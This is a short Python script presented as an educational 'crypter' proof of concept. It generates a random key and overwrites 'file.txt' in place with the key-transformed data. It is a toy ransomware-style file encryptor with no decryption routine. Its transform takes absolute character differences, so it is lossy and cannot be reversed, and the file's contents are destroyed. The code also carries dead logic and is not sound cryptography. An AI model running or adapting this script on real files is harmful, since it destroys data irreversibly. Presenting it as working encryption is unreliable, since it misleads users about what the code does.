#! /usr/bin/env python3
import os
import sys
import time
import random

# Created by Tristian V.
# Crypter POC
# Version: 1.0
# Description: 
# Please don't deploy me, I'm for educational purposes only :)

class crypter:
   def __init__(self, name):
      self.name = name;
      print(f'[+] Target: {self.name}')

   def encrypt(self):
      with open(self.name) as f:
         IN_DATA,a,b = f.read(),0,[]
         f.close() 
      for i in IN_DATA:
         try:
            for x in self.key:
               b+=[abs(ord(i)-ord(x))]
               a+=1
         except:
            a=0
      with open(self.name, 'w') as f:
         f.write(''.join(list(map(chr,b))))
         f.close()
      print('[+] File encrypted!')

   def gen_key(self):
      self.key = ''
      for i in range(30):
         self.key += chr(random.randint(33,126))
      print(f'[+] Key generated: {self.key}')

def main(argc,argv):
   a=crypter("file.txt")
   a.gen_key()
   a.encrypt()
if(__name__=='__main__'):
   main(len(sys.argv),sys.argv)
